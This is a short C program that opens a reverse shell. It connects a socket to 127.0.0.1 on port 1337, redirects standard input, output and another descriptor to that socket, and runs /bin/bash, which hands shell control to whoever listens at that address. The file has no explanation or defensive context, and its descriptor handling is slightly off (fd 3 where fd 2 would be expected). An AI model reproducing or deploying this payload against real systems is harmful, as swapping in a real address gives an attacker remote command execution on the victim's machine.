#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int sock;
    int port = 1337;
    struct sockaddr_in revsockaddr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(sock, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 3);  
    char * const argv[] = {"bin/bash", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;


    
}
